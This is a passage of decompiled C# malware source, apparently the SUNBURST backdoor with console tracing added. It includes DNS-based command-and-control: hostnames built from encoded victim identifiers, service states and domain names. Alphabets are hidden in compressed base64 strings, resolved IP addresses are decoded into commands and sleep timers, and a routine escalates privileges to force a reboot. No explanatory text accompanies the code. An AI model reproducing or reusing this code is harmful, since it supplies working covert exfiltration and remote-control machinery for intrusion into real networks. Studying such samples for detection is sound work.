					IPHostEntry iphostEntry = Program.DnsHelper.GetIPHostEntry(hostName);
					if (iphostEntry != null)
					{
						IPAddress[] addressList = iphostEntry.AddressList;
						for (int i = 0; i < addressList.Length; i++)
						{
							Program.AddressFamilyEx addressFamily = Program.IPAddressesHelper.GetAddressFamily(addressList[i]);
							if (addressFamily != Program.AddressFamilyEx.Error && addressFamily != Program.AddressFamilyEx.Atm)
							{
								return true;
							}
						}
					}
				}
				catch (Exception)
				{
				}
				return false;
			}

			// Token: 0x060009AE RID: 2478 RVA: 0x00045D88 File Offset: 0x00043F88
			public static IPHostEntry GetIPHostEntry(string hostName)
			{
				int[][] array = new int[][]
				{
					new int[]
					{
						25,
						30
					},
					new int[]
					{
						55,
						60
					}
				};
				int num = array.GetLength(0) + 1;
				for (int i = 1; i <= num; i++)
				{
					try
					{
						return Dns.GetHostEntry(hostName);
					}
					catch (SocketException)
					{
					}
					if (i + 1 <= num)
					{
						Program.DelayMs((double)(array[i - 1][0] * 1000), (double)(array[i - 1][1] * 1000));
					}
				}
				return null;
			}

			// Token: 0x060009AF RID: 2479 RVA: 0x00045E20 File Offset: 0x00044020
			public static Program.AddressFamilyEx GetAddressFamily(string hostName, Program.DnsRecords rec)
			{
				rec.cname = null;
				try
				{
					IPHostEntry iphostEntry = Program.DnsHelper.GetIPHostEntry(hostName);
					if (iphostEntry == null)
					{
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Unable to get IP addresses for " + hostName);
						return Program.AddressFamilyEx.Error;
					}
					IPAddress[] addressList = iphostEntry.AddressList;
					int i = 0;
					while (i < addressList.Length)
					{
						IPAddress ipaddress = addressList[i];
						Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Ip address resolved for " + hostName + " " + ipaddress);

						if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Address family is InterNetwork");
							if (!(iphostEntry.HostName != hostName) || string.IsNullOrEmpty(iphostEntry.HostName))
							{
								Program.IPAddressesHelper.GetAddresses(ipaddress, rec);
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Geting addresses for " + ipaddress + "Rec" + rec);
								return Program.IPAddressesHelper.GetAddressFamily(ipaddress, out rec.dnssec);
							}
							rec.cname = iphostEntry.HostName;
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Rec.cname is now " + iphostEntry.HostName);
							if (Program.IPAddressesHelper.GetAddressFamily(ipaddress) == Program.AddressFamilyEx.Atm)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Address family is InterNetwork");
								return Program.AddressFamilyEx.Atm;
							}
							if (rec.dnssec)
							{
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - rec.DNSSEC is true");
								rec.dnssec = false;
								Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Address family is Netbios");
								return Program.AddressFamilyEx.NetBios;
							}
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Unable to identify address family");
							return Program.AddressFamilyEx.Error;
						}
						else
						{
							i++;
						}
					}
					return Program.AddressFamilyEx.Unknown;
				}
				catch (Exception)
				{
				}
				return Program.AddressFamilyEx.Error;
			}
		}

		// Token: 0x020000D7 RID: 215
		private class CryptoHelper
		{
			// Token: 0x060009B0 RID: 2480 RVA: 0x00045EE8 File Offset: 0x000440E8
			public CryptoHelper(byte[] userId, string domain)
			{
				this.guid = userId.ToArray<byte>();
				this.dnStr = Program.CryptoHelper.DecryptShort(domain);
				this.offset = 0;
				this.nCount = 0;
			}

			// Token: 0x060009B1 RID: 2481 RVA: 0x00045F18 File Offset: 0x00044118
			private static string Base64Decode(string s)
			{
				// rq3gsalt6u1iyfzop572d49bnx8cvmkewhj
				string text = Program.ZipHelper.Unzip("Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==");
				// 0_-.
				string text2 = Program.ZipHelper.Unzip("M4jX1QMA");
				string text3 = "";
				Random random = new Random();
				foreach (char value in s)
				{
					int num = text2.IndexOf(value);
					text3 = ((num < 0) ? (text3 + text[(text.IndexOf(value) + 4) % text.Length].ToString()) : (text3 + text2[0].ToString() + text[num + random.Next() % (text.Length / text2.Length) * text2.Length].ToString()));
				}
				return text3;
			}

			// Token: 0x060009B2 RID: 2482 RVA: 0x00045FF0 File Offset: 0x000441F0
			private static string Base64Encode(byte[] bytes, bool rt)
			{
				// ph2eifo3n5utg1j8d94qrvbmk0sal76c
				string text = Program.ZipHelper.Unzip("K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==");
				string text2 = "";
				uint num = 0U;
				int i = 0;
				foreach (byte b in bytes)
				{
					num |= (uint)((uint)b << i);
					for (i += 8; i >= 5; i -= 5)
					{
						text2 += text[(int)(num & 31U)].ToString();
						num >>= 5;
					}
				}
				if (i > 0)
				{
					if (rt)
					{
						num |= (uint)((uint)new Random().Next() << i);
					}
					text2 += text[(int)(num & 31U)].ToString();
				}
				return text2;
			}

			// Token: 0x060009B3 RID: 2483 RVA: 0x0004609C File Offset: 0x0004429C
			private static string CreateSecureString(byte[] data, bool flag)
			{
				byte[] array = new byte[data.Length + 1];
				array[0] = (byte)new Random().Next(1, 127);
				if (flag)
				{
					byte[] array2 = array;
					int num = 0;
					array2[num] |= 128;
				}
				for (int i = 1; i < array.Length; i++)
				{
					array[i] = (byte)(data[i - 1] ^ array[0]);
				}
				return Program.CryptoHelper.Base64Encode(array, true);
			}

			// Token: 0x060009B4 RID: 2484 RVA: 0x000460FC File Offset: 0x000442FC
			private static string CreateString(int n, char c)
			{
				if (n < 0 || n >= 36)
				{
					n = 35;
				}
				n = (n + (int)c) % 36;
				if (n < 10)
				{
					return ((char)(48 + n)).ToString();
				}
				return ((char)(97 + n - 10)).ToString();
			}

			// Token: 0x060009B5 RID: 2485 RVA: 0x00046144 File Offset: 0x00044344
			private static string DecryptShort(string domain)
			{
				// 0123456789abcdefghijklmnopqrstuvwxyz-_.
				if (domain.All((char c) => Program.ZipHelper.Unzip("MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA=").Contains(c)))
				{
					return Program.CryptoHelper.Base64Decode(domain);
				}
				return "00" + Program.CryptoHelper.Base64Encode(Encoding.UTF8.GetBytes(domain), false);
			}

			// Token: 0x060009B6 RID: 2486 RVA: 0x0004619C File Offset: 0x0004439C
			private string GetStatus()
			{
				Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - GetStatus() return new C2 host ." + Program.domain2 + "." + Program.domain3[(int)this.guid[0] % Program.domain3.Length] + "." + Program.domain1);
				return string.Concat(new string[]
				{
					".",
					Program.domain2,
					".",
					Program.domain3[(int)this.guid[0] % Program.domain3.Length],
					".",
					Program.domain1
				});
			}

			// Token: 0x060009B7 RID: 2487 RVA: 0x000461F8 File Offset: 0x000443F8
			private static int GetStringHash(bool flag)
			{
				return ((int)((DateTime.UtcNow - new DateTime(2010, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMinutes / 30.0) & 524287) << 1 | (flag ? 1 : 0);
			}

			// Token: 0x060009B8 RID: 2488 RVA: 0x00046244 File Offset: 0x00044444
			private byte[] UpdateBuffer(int sz, byte[] data, bool flag)
			{
				byte[] array = new byte[this.guid.Length + ((data != null) ? data.Length : 0) + 3];
				Array.Clear(array, 0, array.Length);
				Array.Copy(this.guid, array, this.guid.Length);
				int stringHash = Program.CryptoHelper.GetStringHash(flag);
				array[this.guid.Length] = (byte)((stringHash & 983040) >> 16 | (sz & 15) << 4);
				array[this.guid.Length + 1] = (byte)((stringHash & 65280) >> 8);
				array[this.guid.Length + 2] = (byte)(stringHash & 255);
				if (data != null)
				{
					Array.Copy(data, 0, array, array.Length - data.Length, data.Length);
				}
				for (int i = 0; i < this.guid.Length; i++)
				{
					byte[] array2 = array;
					int num = i;
					array2[num] ^= array[this.guid.Length + 2 - i % 2];
				}
				return array;
			}

			// Token: 0x060009B9 RID: 2489 RVA: 0x0004631C File Offset: 0x0004451C
			public string GetNextStringEx(bool flag)
			{
				byte[] array = new byte[(Program.svcList.Length * 2 + 7) / 8];
				Array.Clear(array, 0, array.Length);
				for (int i = 0; i < Program.svcList.Length; i++)
				{
					int num = Convert.ToInt32(Program.svcList[i].stopped) | Convert.ToInt32(Program.svcList[i].running) << 1;
					byte[] array2 = array;
					int num2 = array.Length - 1 - i / 4;
					array2[num2] |= Convert.ToByte(num << i % 4 * 2);
				}
				return Program.CryptoHelper.CreateSecureString(this.UpdateBuffer(2, array, flag), false) + this.GetStatus();
			}

			// Token: 0x060009BA RID: 2490 RVA: 0x000463BB File Offset: 0x000445BB
			public string GetNextString(bool flag)
			{
				return Program.CryptoHelper.CreateSecureString(this.UpdateBuffer(1, null, flag), false) + this.GetStatus();
			}

			// Token: 0x060009BB RID: 2491 RVA: 0x000463D8 File Offset: 0x000445D8
			public string GetPreviousString(out bool last)
			{
				string text = Program.CryptoHelper.CreateSecureString(this.guid, true);
				int num = 32 - text.Length - 1;
				string result = "";
				last = false;
				if (this.offset >= this.dnStr.Length || this.nCount > 36)
				{
					return result;
				}
				int num2 = Math.Min(num, this.dnStr.Length - this.offset);
				this.dnStrLower = this.dnStr.Substring(this.offset, num2);
				this.offset += num2;
				// -_0
				if (Program.ZipHelper.Unzip("0403AAA=").Contains(this.dnStrLower[this.dnStrLower.Length - 1]))
				{
					if (num2 == num)
					{
						this.offset--;
						this.dnStrLower = this.dnStrLower.Remove(this.dnStrLower.Length - 1);
					}
					this.dnStrLower += "0";
				}
				if (this.offset >= this.dnStr.Length || this.nCount > 36)
				{
					this.nCount = -1;
				}
				result = text + Program.CryptoHelper.CreateString(this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
				if (this.nCount >= 0)
				{
					this.nCount++;
				}
				last = (this.nCount < 0);
				return result;
			}

			// Token: 0x060009BC RID: 2492 RVA: 0x00046540 File Offset: 0x00044740
			public string GetCurrentString()
			{
				string text = Program.CryptoHelper.CreateSecureString(this.guid, true);
				return text + Program.CryptoHelper.CreateString((this.nCount > 0) ? (this.nCount - 1) : this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
			}

			// Token: 0x040002FF RID: 767
			private const int dnSize = 32;

			// Token: 0x04000300 RID: 768
			private const int dnCount = 36;

			// Token: 0x04000301 RID: 769
			private readonly byte[] guid;

			// Token: 0x04000302 RID: 770
			private readonly string dnStr;

			// Token: 0x04000303 RID: 771
			private string dnStrLower;

			// Token: 0x04000304 RID: 772
			private int nCount;

			// Token: 0x04000305 RID: 773
			private int offset;
		}

		// Token: 0x020000D8 RID: 216
		private class DnsRecords
		{
			// Token: 0x04000306 RID: 774
			public int A;

			// Token: 0x04000307 RID: 775
			public int _type;

			// Token: 0x04000308 RID: 776
			public int length;

			// Token: 0x04000309 RID: 777
			public string cname;

			// Token: 0x0400030A RID: 778
			public bool dnssec;
		}

		// Token: 0x020000D9 RID: 217
		private class IPAddressesHelper
		{
			// Token: 0x060009BE RID: 2494 RVA: 0x00046591 File Offset: 0x00044791
			public IPAddressesHelper(string subnet, string mask, Program.AddressFamilyEx family, bool ext)
			{
				this.family = family;
				this.subnet = IPAddress.Parse(subnet);
				this.mask = IPAddress.Parse(mask);
				this.ext = ext;
			}

			// Token: 0x060009BF RID: 2495 RVA: 0x000465C0 File Offset: 0x000447C0
			public IPAddressesHelper(string subnet, string mask, Program.AddressFamilyEx family) : this(subnet, mask, family, false)
			{
			}

			// Token: 0x060009C0 RID: 2496 RVA: 0x000465CC File Offset: 0x000447CC
			public static void GetAddresses(IPAddress address, Program.DnsRecords rec)
			{
				Random random = new Random();
				byte[] addressBytes = address.GetAddressBytes();
				int num = (int)(addressBytes[(int)((long)addressBytes.Length) - 2] & 10);
				if (num != 2)
				{
					if (num != 8)
					{
						if (num != 10)
						{
							rec.length = 0;
						}
						else
						{
							rec.length = 3;
						}
					}
					else
					{
						rec.length = 2;
					}
				}
				else
				{
					rec.length = 1;
				}
				num = (int)(addressBytes[(int)((long)addressBytes.Length) - 1] & 136);
				if (num != 8)
				{
					if (num != 128)
					{
						if (num != 136)
						{
							rec._type = 0;
						}
						else
						{
							rec._type = 3;
						}
					}
					else
					{
						rec._type = 2;
					}
				}
				else
				{
					rec._type = 1;
				}
				num = (int)(addressBytes[(int)((long)addressBytes.Length) - 1] & 84);
				if (num <= 20)
				{
					if (num == 4)
					{
						rec.A = random.Next(240, 300);
						return;
					}
					if (num == 16)
					{
						rec.A = random.Next(480, 600);
						return;
					}
					if (num == 20)
					{
						rec.A = random.Next(1440, 1560);
						return;
					}
				}
				else if (num <= 68)
				{
					if (num == 64)
					{
						rec.A = random.Next(4320, 5760);
						return;
					}
					if (num == 68)
					{
						rec.A = random.Next(10020, 10140);
						return;
					}
				}
				else
				{
					if (num == 80)
					{
						rec.A = random.Next(20100, 20220);
						return;
					}
					if (num == 84)
					{
						rec.A = random.Next(43140, 43260);
						return;
					}
				}
				rec.A = 0;
			}

			// Token: 0x060009C1 RID: 2497 RVA: 0x00046760 File Offset: 0x00044960
			public static Program.AddressFamilyEx GetAddressFamily(IPAddress address)
			{
				bool flag;
				return Program.IPAddressesHelper.GetAddressFamily(address, out flag);
			}

			// Token: 0x060009C2 RID: 2498 RVA: 0x00046778 File Offset: 0x00044978
			public static Program.AddressFamilyEx GetAddressFamily(IPAddress address, out bool ext)
			{
				ext = false;
				try
				{
					if (IPAddress.IsLoopback(address) || address.Equals(IPAddress.Any) || address.Equals(IPAddress.IPv6Any))
					{
						return Program.AddressFamilyEx.Atm;
					}
					if (address.AddressFamily == AddressFamily.InterNetworkV6)
					{
						byte[] addressBytes = address.GetAddressBytes();
						if (addressBytes.Take(10).All((byte b) => b == 0) && addressBytes[10] == addressBytes[11] && (addressBytes[10] == 0 || addressBytes[10] == 255))
						{
							address = address.MapToIPv4();
						}
					}
					else if (address.AddressFamily != AddressFamily.InterNetwork)
					{
						return Program.AddressFamilyEx.Unknown;
					}
					byte[] addressBytes2 = address.GetAddressBytes();
					foreach (Program.IPAddressesHelper ipaddressesHelper in Program.nList)
					{
						if (!Program.printm)
						{
							Console.WriteLine("[" + DateTime.Now.ToString("hh.mm.ss.fffffff") + "] - Checking IP address to predefined networks: " + ipaddressesHelper.subnet + " " + ipaddressesHelper.mask + " " + ipaddressesHelper.ext + " " + ipaddressesHelper.family);
						}
						byte[] addressBytes3 = ipaddressesHelper.subnet.GetAddressBytes();
						byte[] addressBytes4 = ipaddressesHelper.mask.GetAddressBytes();
						if (addressBytes2.Length == addressBytes4.Length && addressBytes2.Length == addressBytes3.Length)
						{
							bool flag = true;
							for (int j = 0; j < addressBytes2.Length; j++)
							{
								if ((addressBytes2[j] & addressBytes4[j]) != (addressBytes3[j] & addressBytes4[j]))
								{
									flag = false;
									break;
								}
							}
							if (flag)
							{
								ext = ipaddressesHelper.ext;
								return ipaddressesHelper.family;
							}
						}
					}
					return (address.AddressFamily == AddressFamily.InterNetworkV6) ? Program.AddressFamilyEx.InterNetworkV6 : Program.AddressFamilyEx.InterNetwork;
				}
				catch (Exception)
				{
				}
				return Program.AddressFamilyEx.Error;
			}

			// Token: 0x0400030B RID: 779
			private readonly IPAddress subnet;

			// Token: 0x0400030C RID: 780
			private readonly IPAddress mask;

			// Token: 0x0400030D RID: 781
			private readonly Program.AddressFamilyEx family;

			// Token: 0x0400030E RID: 782
			private readonly bool ext;
		}

		// Token: 0x020000DA RID: 218
		private static class ZipHelper
		{
			// Token: 0x060009C3 RID: 2499 RVA: 0x000468FC File Offset: 0x00044AFC
			public static byte[] Compress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (DeflateStream deflateStream = new DeflateStream(memoryStream2, CompressionMode.Compress))
						{
							memoryStream.CopyTo(deflateStream);
						}
						result = memoryStream2.ToArray();
					}
				}
				return result;
			}

			// Token: 0x060009C4 RID: 2500 RVA: 0x00046978 File Offset: 0x00044B78
			public static byte[] Decompress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (MemoryStream memoryStream2 = new MemoryStream())
					{
						using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
						{
							deflateStream.CopyTo(memoryStream2);
						}
						result = memoryStream2.ToArray();
					}
				}
				return result;
			}

			// Token: 0x060009C5 RID: 2501 RVA: 0x000469F4 File Offset: 0x00044BF4
			public static string Zip(string input)
			{
				if (string.IsNullOrEmpty(input))
				{
					return input;
				}
				string result;
				try
				{
					result = Convert.ToBase64String(Program.ZipHelper.Compress(Encoding.UTF8.GetBytes(input)));
				}
				catch (Exception)
				{
					result = "";
				}
				return result;
			}

			// Token: 0x060009C6 RID: 2502 RVA: 0x00046A40 File Offset: 0x00044C40
			public static string Unzip(string input)
			{
				if (string.IsNullOrEmpty(input))
				{
					return input;
				}
				string result;
				try
				{
					byte[] bytes = Program.ZipHelper.Decompress(Convert.FromBase64String(input));
					result = Encoding.UTF8.GetString(bytes);
				}
				catch (Exception)
				{
					result = input;
				}
				return result;
			}
		}

		// Token: 0x020000DB RID: 219
		public class NativeMethods
		{
			// Token: 0x060009C7 RID: 2503
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("kernel32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool CloseHandle(IntPtr handle);

			// Token: 0x060009C8 RID: 2504
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool AdjustTokenPrivileges([In] IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)][In] bool DisableAllPrivileges, [In] ref Program.NativeMethods.TOKEN_PRIVILEGE NewState, [In] uint BufferLength, [In][Out] ref Program.NativeMethods.TOKEN_PRIVILEGE PreviousState, [In][Out] ref uint ReturnLength);

			// Token: 0x060009C9 RID: 2505
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "LookupPrivilegeValueW", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool LookupPrivilegeValue([In] string lpSystemName, [In] string lpName, [In][Out] ref Program.NativeMethods.LUID Luid);

			// Token: 0x060009CA RID: 2506
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern IntPtr GetCurrentProcess();

			// Token: 0x060009CB RID: 2507
			[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			private static extern bool OpenProcessToken([In] IntPtr ProcessToken, [In] TokenAccessLevels DesiredAccess, [In][Out] ref IntPtr TokenHandle);

			// Token: 0x060009CC RID: 2508
			[DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "InitiateSystemShutdownExW", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool InitiateSystemShutdownEx([In] string lpMachineName, [In] string lpMessage, [In] uint dwTimeout, [MarshalAs(UnmanagedType.Bool)][In] bool bForceAppsClosed, [MarshalAs(UnmanagedType.Bool)][In] bool bRebootAfterShutdown, [In] uint dwReason);

			// Token: 0x060009CD RID: 2509 RVA: 0x00046A88 File Offset: 0x00044C88
			public static bool RebootComputer()
			{
				bool flag = false;
				bool result;
				try
				{
					bool newState = false;
					string privilege = Program.ZipHelper.Unzip("C04NzigtSckvzwsoyizLzElNTwUA");
					if (!Program.NativeMethods.SetProcessPrivilege(privilege, true, out newState))
					{
						result = flag;
					}
					else
					{
						flag = Program.NativeMethods.InitiateSystemShutdownEx(null, null, 0U, true, true, 2147745794U);
						Program.NativeMethods.SetProcessPrivilege(privilege, newState, out newState);
						result = flag;
					}
				}
				catch (Exception)
				{
					result = flag;
				}
				return result;
			}

			// Token: 0x060009CE RID: 2510 RVA: 0x00046AE8 File Offset: 0x00044CE8
			public static bool SetProcessPrivilege(string privilege, bool newState, out bool previousState)
			{
				bool flag = false;
				previousState = false;
				bool result;
				try
				{
					IntPtr zero = IntPtr.Zero;
					Program.NativeMethods.LUID luid = default(Program.NativeMethods.LUID);
					luid.LowPart = 0U;
					luid.HighPart = 0U;
					if (!Program.NativeMethods.OpenProcessToken(Program.NativeMethods.GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))
					{
						result = false;
					}
					else if (!Program.NativeMethods.LookupPrivilegeValue(null, privilege, ref luid))
					{
						Program.NativeMethods.CloseHandle(zero);
						result = false;
					}
					else
					{
						Program.NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE = default(Program.NativeMethods.TOKEN_PRIVILEGE);
						Program.NativeMethods.TOKEN_PRIVILEGE token_PRIVILEGE2 = default(Program.NativeMethods.TOKEN_PRIVILEGE);
						token_PRIVILEGE.PrivilegeCount = 1U;
						token_PRIVILEGE.Privilege.Luid = luid;
						token_PRIVILEGE.Privilege.Attributes = (newState ? 2U : 0U);
						uint num = 0U;
						Program.NativeMethods.AdjustTokenPrivileges(zero, false, ref token_PRIVILEGE, (uint)Marshal.SizeOf(token_PRIVILEGE2), ref token_PRIVILEGE2, ref num);
						previousState = ((token_PRIVILEGE2.Privilege.Attributes & 2U) > 0U);
						flag = true;
						Program.NativeMethods.CloseHandle(zero);
						result = flag;
					}
				}
				catch (Exception)
				{
					result = flag;
				}
				return result;
			}

			// Token: 0x0400030F RID: 783
			private const uint SE_PRIVILEGE_DISABLED = 0U;

			// Token: 0x04000310 RID: 784
			private const uint SE_PRIVILEGE_ENABLED = 2U;

			// Token: 0x04000311 RID: 785
			private const string ADVAPI32 = "advapi32.dll";

			// Token: 0x04000312 RID: 786
			private const string KERNEL32 = "kernel32.dll";

			// Token: 0x020001C8 RID: 456
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct LUID
			{
				// Token: 0x040005C8 RID: 1480
				public uint LowPart;

				// Token: 0x040005C9 RID: 1481
				public uint HighPart;
			}

			// Token: 0x020001C9 RID: 457
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct LUID_AND_ATTRIBUTES
			{
				// Token: 0x040005CA RID: 1482
				public Program.NativeMethods.LUID Luid;

				// Token: 0x040005CB RID: 1483
				public uint Attributes;
			}

			// Token: 0x020001CA RID: 458
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct TOKEN_PRIVILEGE
			{
				// Token: 0x040005CC RID: 1484
				public uint PrivilegeCount;

				// Token: 0x040005CD RID: 1485
				public Program.NativeMethods.LUID_AND_ATTRIBUTES Privilege;
			}
		}
	}
}








